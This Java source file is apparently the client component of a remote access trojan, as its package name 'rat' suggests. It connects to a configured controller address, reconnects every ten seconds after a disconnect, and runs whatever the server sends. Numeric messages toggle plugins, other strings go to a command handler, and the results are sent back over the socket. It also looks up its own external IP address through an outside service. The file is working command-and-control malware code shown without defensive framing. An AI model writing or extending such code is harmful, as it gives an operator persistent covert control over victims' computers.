package rat.network;

import rat.Client;
import rat.ClientMain;
import rat.plugins.AbstractPlugin;
import rat.plugins.command.CommandCallback;
import rat.plugins.command.CommandHandler;

import java.io.*;
import java.net.*;

public class ClientConnection implements Runnable
{
    private Socket serverSocket;
    private DataOutputStream outputStream;
    private DataInputStream inputStream;
    private PrintWriter printWriter;
    private BufferedReader reader;

    private String address;
    private int port;

    public ClientConnection(Client client)
    {
        this.address = client.getAddress();
        this.port = client.getPort();
    }

    @Override
    public void run()
    {
        reconnect:
        while (true)
        {
            try
            {
                this.serverSocket = connect(address, port);
                this.outputStream = new DataOutputStream(serverSocket.getOutputStream());
                this.inputStream = new DataInputStream(serverSocket.getInputStream());
                this.printWriter = new PrintWriter(outputStream, true);
                this.reader = new BufferedReader(new InputStreamReader(inputStream));
            }
            catch (IOException e)
            {
                e.printStackTrace();

                try
                {
                    Thread.sleep(10000L);
                    continue reconnect;
                }
                catch (InterruptedException e1)
                {
                    e1.printStackTrace();
                }
            }

            System.out.println("Connected!");

            while (!serverSocket.isClosed())
            {
                try
                {
                    String string;

                    while ((string = reader.readLine()) != null)
                    {
                        System.out.println(string);

                        if (isInteger(string))
                        {
                            AbstractPlugin plugin = (AbstractPlugin) ClientMain.getPluginHandler().getPlugin(Byte.valueOf(string));

                            if (plugin.isRunning())
                            {
                                plugin.stop();
                                ClientMain.getPluginHandler().removeActivePlugin(Byte.valueOf(string));
                            }
                            else
                            {
                                plugin.clone().start();
                            }
                        }
                        else
                        {
                            CommandHandler.callCommand(string, new CommandCallback()
                            {
                                @Override
                                public void onCallback(String string)
                                {
                                    printWriter.println(string);
                                }
                            });
                        }
                    }
                }
                catch (IOException e)
                {
                    e.printStackTrace();
                    try
                    {
                        serverSocket.close();
                    }
                    catch (IOException e1)
                    {
                        e1.printStackTrace();
                    }
                    continue reconnect;
                }
            }

            System.out.println("Disconnected!");

            try
            {
                Thread.sleep(10000);
            }
            catch (InterruptedException e)
            {
                e.printStackTrace();
            }
        }
    }

    private Socket connect(String address, int port) throws IOException
    {
        address = addressToIp(address);
        System.out.println("Connecting to " + address + " via port: " + port);
        return new Socket(address, port);
    }

    private String addressToIp(String address) throws MalformedURLException, UnknownHostException
    {
        boolean containsProtocol = address.toLowerCase().contains("http://");

        String externalIp = containsProtocol ?
                InetAddress.getByName(new URL(this.address).getHost()).getHostAddress() :
                InetAddress.getByName(new URL("http://" + this.address).getHost()).getHostAddress();

        try
        {
            String myExternalIp = new BufferedReader(new InputStreamReader(
                    new URL("http://checkip.amazonaws.com/").openStream())).readLine();
            if (externalIp.equals(myExternalIp))
            {
                return "127.0.0.1";
            }
        }
        catch (IOException ignored)
        {
        }

        return externalIp;
    }

    public static boolean isInteger(String s)
    {
        return isInteger(s, 10);
    }

    public static boolean isInteger(String s, int radix)
    {
        if (s.isEmpty())
        {
            return false;
        }
        for (int i = 0; i < s.length(); i++)
        {
            if (i == 0 && s.charAt(i) == '-')
            {
                if (s.length() == 1)
                {
                    return false;
                }
                else
                {
                    continue;
                }
            }
            if (Character.digit(s.charAt(i), radix) < 0)
            {
                return false;
            }
        }
        return true;
    }
}
